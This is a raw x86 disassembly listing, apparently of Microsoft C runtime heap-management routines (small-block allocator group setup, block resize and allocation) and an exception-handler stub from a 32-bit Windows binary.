  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
